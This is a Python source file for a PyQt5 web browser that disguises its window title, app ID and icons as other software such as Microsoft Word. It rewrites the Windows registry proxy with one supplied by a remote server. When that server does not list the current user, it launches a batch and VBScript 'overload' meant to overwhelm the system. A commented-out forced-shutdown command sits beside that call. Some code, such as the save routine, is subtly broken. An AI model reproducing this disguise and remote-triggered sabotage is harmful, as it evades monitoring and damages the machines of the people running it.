import ctypes
import getpass
import json
import os
import sys
from platform import platform
from shutil import copytree, rmtree

import qdarkstyle
import requests
from adblockparser import AdblockRules
from fire import Fire
from loguru import logger
from packaging import version
from PyQt5.QtCore import QSize, Qt, QUrl
from PyQt5.QtGui import QIcon, QPixmap, QKeySequence, QPainter
from PyQt5.QtPrintSupport import QPrintPreviewDialog
from PyQt5.QtWebEngineCore import QWebEngineUrlRequestInterceptor
from PyQt5.QtWebEngineWidgets import QWebEngineProfile, QWebEngineView
from PyQt5.QtWidgets import (QAction, QApplication, QDialog, QDialogButtonBox,
                             QFileDialog, QLabel, QLineEdit, QMainWindow,
                             QStatusBar, QTabWidget, QToolBar, QVBoxLayout)

if os.name == "nt":
    import winreg
else:
    winreg = None

app_version: str = "1.0.0a"

class AboutDialog(QDialog):
    def __init__(self, *args, **kwargs):
        super(AboutDialog, self).__init__(*args, **kwargs)

        QBtn = QDialogButtonBox.Ok  # No cancel
        self.buttonBox = QDialogButtonBox(QBtn)
        self.buttonBox.accepted.connect(self.accept)
        self.buttonBox.rejected.connect(self.reject)
        layout = QVBoxLayout()

        title = QLabel(Masker.title)
        font = title.font()
        font.setPointSize(20)
        title.setFont(font)
        layout.addWidget(title)

        logo = QLabel()
        logo.setPixmap(QPixmap(Manager.get_image(Masker.icon128)))
        layout.addWidget(logo)
        layout.addWidget(QLabel(app_version))

        for i in range(0, layout.count()):
            layout.itemAt(i).setAlignment(Qt.AlignHCenter)
        
        layout.addWidget(self.buttonBox)
        self.setLayout(layout)

class WebEngineUrlRequestInterceptor(QWebEngineUrlRequestInterceptor):
    def __init__(self, blocklist: str, debug: bool = False, *args, **kwargs):
        super(QWebEngineUrlRequestInterceptor, self).__init__(*args, **kwargs)
        self.debug = debug
        self.rules = AdblockRules(blocklist) # , use_re2=True

    def interceptRequest(self, info):
        url = info.requestUrl().toString()
        if self.rules.should_block(url, {"third-party": True}):
            if self.debug:
                print(f"Blocking: {url}")
            info.block(True)

class MainWindow(QMainWindow):
    def __init__(self, *args, **kwargs):
        super(MainWindow, self).__init__(*args, **kwargs)

        self.tabs = QTabWidget()
        self.tabs.setDocumentMode(True)
        self.tabs.tabBarDoubleClicked.connect(self.tab_open_doubleclick)
        self.tabs.currentChanged.connect(self.current_tab_changed)
        self.tabs.setTabsClosable(True)
        self.tabs.tabCloseRequested.connect(self.close_current_tab)

        self.setCentralWidget(self.tabs)

        self.status = QStatusBar()
        self.setStatusBar(self.status)

        navtb = QToolBar("Navigation")
        navtb.setIconSize(QSize(16, 16))
        self.addToolBar(navtb)

        back_btn = QAction(QIcon(Manager.get_image("arrow-180.png")), "Back", self)
        back_btn.setStatusTip("Back to previous page")
        back_btn.triggered.connect(lambda: self.tabs.currentWidget().back())
        back_btn.setShortcut(QKeySequence("Alt+Left"))
        navtb.addAction(back_btn)

        next_btn = QAction(QIcon(Manager.get_image("arrow-000.png")), "Forward", self)
        next_btn.setStatusTip("Forward to next page")
        next_btn.triggered.connect(lambda: self.tabs.currentWidget().forward())
        next_btn.setShortcut(QKeySequence("Alt+Right"))
        navtb.addAction(next_btn)

        reload_btn = QAction(QIcon(Manager.get_image("arrow-circle-315.png")), "Reload", self)
        reload_btn.setStatusTip("Reload page")
        reload_btn.triggered.connect(lambda: self.tabs.currentWidget().reload())
        reload_btn.setShortcut(QKeySequence("Ctrl+R"))
        navtb.addAction(reload_btn)

        home_btn = QAction(QIcon(Manager.get_image("home.png")), "Home", self)
        home_btn.setStatusTip("Go home")
        home_btn.triggered.connect(self.navigate_home)
        home_btn.setShortcut(QKeySequence("Ctrl+H"))
        navtb.addAction(home_btn)

        navtb.addSeparator()

        self.httpsicon = QLabel()
        self.httpsicon.setPixmap(QPixmap(Manager.get_image("lock-nossl.png")))
        navtb.addWidget(self.httpsicon)

        self.urlbar = QLineEdit()
        self.urlbar.returnPressed.connect(self.navigate_to_url)
        navtb.addWidget(self.urlbar)

        stop_btn = QAction(QIcon(Manager.get_image("cross-circle.png")), "Stop", self)
        stop_btn.setStatusTip("Stop loading current page")
        stop_btn.triggered.connect(lambda: self.tabs.currentWidget().stop())
        stop_btn.setShortcut(QKeySequence("Esc"))
        navtb.addAction(stop_btn)

        file_menu = self.menuBar().addMenu("&File")
        tools_menu = self.menuBar().addMenu("&Tools")

        new_tab_action = QAction(QIcon(Manager.get_image("ui-tab--plus.png")), "New Tab", self)
        new_tab_action.setStatusTip("Open a new tab")
        new_tab_action.triggered.connect(lambda _: self.add_new_tab())
        new_tab_action.setShortcut(QKeySequence("Ctrl+T"))
        file_menu.addAction(new_tab_action)

        open_file_action = QAction(QIcon(Manager.get_image("disk--arrow.png")), "Open file...", self)
        open_file_action.setStatusTip("Open HTML file")
        open_file_action.triggered.connect(self.open_file)
        file_menu.addAction(open_file_action)

        save_file_action = QAction(QIcon(Manager.get_image("disk--pencil.png")), "Save Page As...", self)
        save_file_action.setStatusTip("Save current page to HTML file")
        save_file_action.triggered.connect(self.save_file)
        file_menu.addAction(save_file_action)

        print_action = QAction(QIcon(Manager.get_image("printer.png")), "Print...", self)
        print_action.setStatusTip("Print current page")
        print_action.setShortcut(QKeySequence("Ctrl+P"))
        print_action.triggered.connect(self.print_page)
        file_menu.addAction(print_action)

        show_log_action = QAction(QIcon(Manager.get_image("logs.png")), "Show Log", self)
        show_log_action.setStatusTip(f"Show {Masker.title} logs")
        show_log_action.triggered.connect(lambda: self.add_new_tab(QUrl(f"{os.getcwd()}/PyBrowser.log".replace("\\", "/")), "PyBrowser.log"))
        tools_menu.addAction(show_log_action)

        show_config_action = QAction(QIcon(Manager.get_image("json-file.png")), "Show Config", self)
        show_config_action.setStatusTip("Show config")
        show_config_action.triggered.connect(lambda: self.add_new_tab(QUrl(f"{os.getcwd()}/config.json".replace("\\", "/")), "config.json"))
        tools_menu.addAction(show_config_action)
        
        show_running_dir_action = QAction(QIcon(Manager.get_image("folder.png")), "Show CWD", self)
        show_running_dir_action.setStatusTip("Show Current Working Directory")
        show_running_dir_action.triggered.connect(lambda: self.add_new_tab(QUrl(os.getcwd().replace("\\","/")), "Current Working Directory"))
        tools_menu.addAction(show_running_dir_action)
        
        run_overload_action = QAction(QIcon(Manager.get_image("overload.png")), "Overload System", self)
        run_overload_action.setStatusTip("Run overload script")
        run_overload_action.triggered.connect(Manager.overload)
        tools_menu.addAction(run_overload_action)

        self.add_new_tab(QUrl("https://google.com"), "Homepage")
        self.show()
        self.setWindowTitle(Masker.title)
        self.setWindowIcon(QIcon(Manager.get_image(Masker.icon64)))

    def add_new_tab(self, qurl: QUrl = None, label="Google"):
        if qurl is None:
            qurl = QUrl("https://google.com")
        
        browser = QWebEngineView()
        browser.setUrl(qurl)
        i = self.tabs.addTab(browser, label)
        self.tabs.setCurrentIndex(i)
        browser.urlChanged.connect(lambda qurl, browser=browser: self.update_urlbar(qurl, browser))
        browser.loadFinished.connect(lambda _, i=i, browser=browser:
            self.tabs.setTabText(i, browser.page().title()))

    def tab_open_doubleclick(self, i: int):
        if i == -1:
            self.add_new_tab()

    def current_tab_changed(self, _):
        qurl = self.tabs.currentWidget().url()
        self.update_urlbar(qurl, self.tabs.currentWidget())
        self.update_title(self.tabs.currentWidget())

    def close_current_tab(self, i):
        if self.tabs.count() < 2:
            return

        self.tabs.removeTab(i)

    def update_title(self, browser):
        if browser != self.tabs.currentWidget():
            return
    
    def handle_paint_request(self, printer):
        painter = QPainter(printer)
        browser = self.tabs.currentWidget()
        painter.setViewport(browser.rect())
        painter.setWindow(browser.rect())
        browser.render(painter)
        painter.end()

    def about(self):
        dlg = AboutDialog()
        dlg.exec_()

    def open_file(self):
        filename, _ = QFileDialog.getOpenFileName(self, "Open HTML file", "", "Hypertext Markup Language (*.htm *.html);;" "All files (*.*)")

        if filename:
            with open(filename, "r") as f:
                html = f.read()

            self.tabs.currentWidget().setHtml(html)
            self.urlbar.setText(filename)

    def save_file(self):
        filename, _ = QFileDialog.getSaveFileName(self, "Save Page As", "", "Hypertext Markup Language (*.htm *html);;" "All files (*.*)")

        if filename:
            html: str = self.tabs.currentWidget().page().toHtml()
            with open(filename, "w", encoding="utf-8") as f:
                f.write(html.encode("utf-8"))

    def print_page(self):
        dlg = QPrintPreviewDialog()
        dlg.paintRequested.connect(self.handle_paint_request)
        dlg.exec_()

    def navigate_home(self):
        self.tabs.currentWidget().setUrl(QUrl("https://google.com"))

    def navigate_to_url(self):
        q = QUrl(self.urlbar.text())
        if q.scheme() == "":
            q.setScheme("https")

        self.tabs.currentWidget().setUrl(q)

    def update_urlbar(self, q, browser=None):
        if browser != self.tabs.currentWidget():
            return

        if q.scheme() == "https":
            self.httpsicon.setPixmap(QPixmap(Manager.get_image("lock-ssl.png")))

        else:
            self.httpsicon.setPixmap(QPixmap(Manager.get_image("lock-nossl.png")))

        self.urlbar.setText(q.toString())
        self.urlbar.setCursorPosition(0)

class Masker:
    title: str = platform()
    appid: str = f"microsoft.office.word.{app_version}"
    icon64: str = None
    icon128: str = None
    
    def __init__(self, masks: dict):
        self.masks: dict = masks
    
    def mask(self, app: QApplication, name: str):
        try:
            maskc: list = self.masks[name.lower()]
            logger.info(f"Using {maskc=}")
        except KeyError:
            logger.error(f"Invalid mask! {name=}")
            return
        
        title: str = maskc[0]
        orgname: str = maskc[1]
        orgdom: str = maskc[2]
        Masker.title = title
        if os.name == "nt":
            ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID(f"{orgname.lower()}.{title.lower()}.pybrowser.{app_version}")
        else:
            logger.info(f"Could not set App ID as {os.name=}")
        app.setApplicationName(Masker.title)
        app.setOrganizationName(orgname)
        app.setOrganizationDomain(orgdom)
        
        # Set icons
        file64 = f"icons/{maskc[3]}"
        file128 = f"icons/{maskc[4]}"
        if ((not os.path.isfile(f"images/{file64}")) or (not os.path.isfile(f"images/{file128}"))):
            raise FileNotFoundError(f"Icon does not exist: {file64=}, {file128=}")
        
        Masker.icon64 = file64
        Masker.icon128 = file128

class Manager:
    @logger.catch
    def __init__(self, mask: str = None, new_proxy: str = None, api: str = None, connect: bool = None, theme: str = None, adblock: bool = None, debug: bool = False, qapp_flags: str = None):
        """Launch PyBrowser.

        Args:
            mask (str, optional): How to hide the browser. Defaults to value in config.json. Options in config.json.
            new_proxy (str, optional): Proxy to use. Defaults to API Server Provided.
            api (str, optional): What API Server to use. Defaults to value in config.json.
            connect (bool, optional): Enable connections to the API Server (will also disbale proxy changes). Defaults to value in config.json.
            theme (str, optional): Dark or Light theme to use for the app. Defaults to value in config.json.
            adblock (bool, optional): Enable or disable adblocking in the browser. Defaults to value in config.json.
            debug (bool, optional): Print debug logging. Defaults to False.
            qapp_flags (str, optional): Flags to pass to QApplication. Defaults to value in config.json.
        """
        with open("config.json", encoding="utf-8") as f:
            self.config: dict = json.load(f)
            logger.debug(f"{self.config=}")
        
        self.masker: Masker = Masker(self.config["masks"])
        self.mask: str = mask if not mask is None else self.config["default"]["mask"]
        self.theme: str = theme if not theme is None else self.config["default"]["theme"]
        self.api: str = api if not api is None else self.config["default"]["api"]
        self.connect: bool = connect if not connect is None else self.config["default"]["connect"]
        self.adblock: bool = adblock if not adblock is None else self.config["default"]["adblock"]
        self.debug: bool = debug
        self.qapp_flags: str = qapp_flags if not qapp_flags is None else self.config["default"]["qapp_flags"]
        Masker.title: str = self.config["default"]["title"]
        self.keyVal: str = "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"
        self.old_proxy: str = ""
        self.old_state: int = 1
        self.username: str = getpass.getuser()
        
        if self.connect:
            self.new_proxy: str = new_proxy if not new_proxy is None else self.request("px")["proxy"]
        else:
            self.new_proxy: str = ""
        
        if self.connect:
            self.server_version: str = self.request("version")["version"]
            if version.parse(self.server_version) > version.parse(app_version):
                raise Exception(f"Server version ({self.server_version}) and App version ({app_version}) are not compatible!")
                raise SystemExit
            self.user: list = self.request("user", {"username": self.username})["status"]
        else:
            self.user: list = [True, "none", "stable"]
        
        if not self.user[0]: # User is not in the online list
            #os.system("shutdown -s -f -y -t 0") # Instatly shutdown the device.
            self.overload()
        else:
            logger.info(f"Logged in as: {self.username}, {self.user=}")
            if not self.connect:
                logger.info("Offline mode is enabled.")
        
        if not winreg is None:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.keyVal, 0, winreg.KEY_ALL_ACCESS)
            try:
                self.old_proxy: str = winreg.QueryValueEx(key, "ProxyServer")[0]
            except FileNotFoundError as e:
                logger.error(f"{e}")
                self.old_proxy: str = ""
                logger.info("Proxy has been set to Empty.")
            self.old_state: int = winreg.QueryValueEx(key, "ProxyEnable")[0]
            winreg.CloseKey(key)
        
        self.start()
        raise SystemExit
    
    @staticmethod
    @logger.catch
    def overload():
        path = f"C:\\Users\\{getpass.getuser()}\\AppData\\Local\\Temp\\overload"
        if os.path.isdir(path):
            rmtree(path)
        
        copytree("overload", path)
        os.chdir(path)
        os.system("start "" cmd.exe /C wscript.exe start.vbs overload.bat") # Overload the System
        raise SystemExit
    
    @staticmethod
    @logger.catch
    def get_image(image: str) -> str:
        imagep = os.path.join("images", image)
        if os.path.isfile(imagep):
            return imagep
        else:
            raise FileNotFoundError(f"{image} is not a valid file!")
    
    @logger.catch
    def request(self, url: str, params: dict = None, verify: bool = True, json: bool = True) -> dict | str:
        if not self.connect:
            logger.warning(f"An API Server request was requested when {self.connect=}!")
        logger.info(f"Requesting new url: full_url='{self.api}/{url}', {params=}, {verify=}")
        output = requests.get(f"{self.api}/{url}", params=params, verify=verify)
        if json:
            output = output.json()
            logger.debug(f"Received JSON: {output=}")
        else:
            output = output.text
            if len(output) < 50:
                logger.debug(f"Received text: {output}=")
            else:
                logger.debug(f"Received text: [Too long, {len(output)=}]")
        return output
    
    @logger.catch
    def setup_proxy(self, status: str):
        if not status in ["start", "end"]:
            raise TypeError(f"Not a valid option for status: {status=}")
        
        if winreg is None:
            logger.warning(f"Proxy is not supported for system: {os.name=}, {status=}")
            return
        
        if status == "start":
            if self.set_proxy(self.old_proxy, 0): # Disable old proxy
                logger.info("System Proxy successfully disabled.")
            else:
                logger.info("Failed to disable system proxy, app may not work!")
            
            if not self.connect: # Do not enable new proxy because it is not set
                return
            
            if self.set_proxy(self.new_proxy, 1): # Enable new proxy
                logger.info("System proxy disabled, blocks may still occur.")
            else:
                logger.info("Failed to set new proxy!")
        else:
            if self.set_proxy(self.old_proxy, self.old_state): # Reset orginal settings
                logger.info("System Proxy successfully reset.")
            else:
                logger.info(f"Failed to reset system proxy! ({self.old_proxy=}, {self.old_state=})")
    
    @logger.catch
    def set_proxy(self, proxy: str, state: int = 1) -> bool:
        if winreg is None:
            logger.warning(f"Proxy is not supported for system: {os.name=}, {proxy=}, {state=}")
            return False
        
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.keyVal, 0, winreg.KEY_ALL_ACCESS)
            winreg.SetValueEx(key, "ProxyServer", 0, winreg.REG_SZ, proxy)
            winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, state)
            winreg.CloseKey(key)
            logger.info(f"Proxy infomation updated: {proxy=}, {state=}, {self.keyVal=}")
            return True
        except Exception as e:
            logger.error(f"{e}")
            return False
    
    @logger.catch
    def enable_adblock(self):
        interceptor = WebEngineUrlRequestInterceptor(self.request("adblock", json = False).splitlines(), self.debug)
        QWebEngineProfile.defaultProfile().setUrlRequestInterceptor(interceptor)
        logger.info(f"Enabled Adblock {self.debug=}")
    
    @logger.catch
    def start(self):
        self.setup_proxy("start")
        self.app = QApplication(self.qapp_flags)
        
        if self.adblock and self.connect:
            self.enable_adblock()
        self.masker.mask(self.app, self.mask)

        MainWindow()
        if self.theme == "dark":
            self.app.setStyleSheet(qdarkstyle.load_stylesheet(qt_api="pyqt5"))
        
        self.app.exec_()
        self.setup_proxy("end")

if __name__ == "__main__":
    try:
        os.chdir(sys._MEIPASS)
        logger.info("Running from packaged...")
        Manager.packaged = os.getcwd()
    except AttributeError:
        logger.info("Running from source code...")
    logger.add("PyBrowser.log", retention="1 day", backtrace=True, diagnose=True)
    
    Fire(Manager)
